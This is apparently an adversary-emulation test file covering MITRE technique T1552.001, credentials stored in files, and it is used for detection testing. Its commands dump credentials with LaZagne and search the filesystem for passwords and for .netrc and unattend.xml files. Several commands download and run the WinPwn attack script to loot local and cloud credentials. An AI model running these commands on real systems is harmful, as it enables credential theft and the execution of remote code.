attack_technique: T1552.001
display_name: 'Unsecured Credentials: Credentials In Files'
atomic_tests:
    - name: Extract Browser and System credentials with LaZagne
      item_id: T1552.001-1
      auto_generated_guid: 9e507bb8-1d30-4e3b-a49b-cb5727d7ea79
      description: |
        [LaZagne Source](https://github.com/AlessandroZ/LaZagne)
      supported_platforms:
        - macos
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            python2 laZagne.py all
        cleanup_command: ""
        name: bash
        elevation_required: true
    - name: Extract passwords with grep
      item_id: T1552.001-2
      auto_generated_guid: bd4cf0d1-7646-474e-8610-78ccf5a097c4
      description: |
        Extracting credentials from files
      supported_platforms:
        - macos
        - linux
      input_arguments:
        file_path:
            description: Path to search
            type: string
            default: /
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            grep -ri password #{file_path}
        cleanup_command: ""
        name: sh
        elevation_required: false
    - name: Extracting passwords with findstr
      item_id: T1552.001-3
      auto_generated_guid: 0e56bf29-ff49-4ea5-9af4-3b81283fd513
      description: |
        Extracting Credentials from Files. Upon execution, the contents of files that contain the word "password" will be displayed.
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            findstr /si pass *.xml *.doc *.txt *.xls
            ls -R | select-string -ErrorAction SilentlyContinue -Pattern password
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: Access unattend.xml
      item_id: T1552.001-4
      auto_generated_guid: 367d4004-5fc0-446d-823f-960c74ae52c3
      description: |
        Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.
        If these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process.
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            type C:\Windows\Panther\unattend.xml
            type C:\Windows\Panther\Unattend\unattend.xml
        cleanup_command: ""
        name: command_prompt
        elevation_required: true
    - name: Find and Access Github Credentials
      item_id: T1552.001-5
      auto_generated_guid: da4f751a-020b-40d7-b9ff-d433b7799803
      description: |
        This test looks for .netrc files (which stores github credentials in clear text )and dumps its contents if found.
      supported_platforms:
        - macos
        - linux
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: "for file in $(find / -name .netrc 2> /dev/null);do echo $file ; cat $file ; done \n"
        cleanup_command: ""
        name: bash
        elevation_required: false
    - name: WinPwn - sensitivefiles
      item_id: T1552.001-6
      auto_generated_guid: 114dd4e3-8d1c-4ea7-bb8d-8d8f6aca21f0
      description: Search for sensitive files on this local system using the SensitiveFiles function of WinPwn
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |-
            $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
            sensitivefiles -noninteractive -consoleoutput
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: WinPwn - Snaffler
      item_id: T1552.001-7
      auto_generated_guid: fdd0c913-714b-4c13-b40f-1824d6c015f2
      description: Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |-
            $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
            Snaffler -noninteractive -consoleoutput
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: WinPwn - powershellsensitive
      item_id: T1552.001-8
      auto_generated_guid: 75f66e03-37d3-4704-9520-3210efbe33ce
      description: Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |-
            $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
            powershellsensitive -consoleoutput -noninteractive
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: WinPwn - passhunt
      item_id: T1552.001-9
      auto_generated_guid: 00e3e3c7-6c3c-455e-bd4b-461c7f0e7797
      description: Search for Passwords on this system using passhunt via WinPwn
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |-
            $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
            passhunt -local $true -noninteractive
        cleanup_command: |-
            rm -force .\passhunt.exe -ErrorAction Ignore
            rm -force .\phunter* -ErrorAction Ignore
            rm -force -recurse .\DomainRecon -ErrorAction Ignore
            rm -force -recurse .\Exploitation -ErrorAction Ignore
            rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
            rm -force -recurse .\LocalRecon -ErrorAction Ignore
            rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
        name: powershell
        elevation_required: false
    - name: WinPwn - SessionGopher
      item_id: T1552.001-10
      auto_generated_guid: c9dc9de3-f961-4284-bd2d-f959c9f9fda5
      description: Launches SessionGopher on this system via WinPwn
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |-
            $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
            sessionGopher -noninteractive -consoleoutput
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials
      item_id: T1552.001-11
      auto_generated_guid: aaa87b0e-5232-4649-ae5c-f1724a4b2798
      description: Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSharpCloud -consoleoutput -noninteractive  "
        cleanup_command: ""
        name: powershell
        elevation_required: false
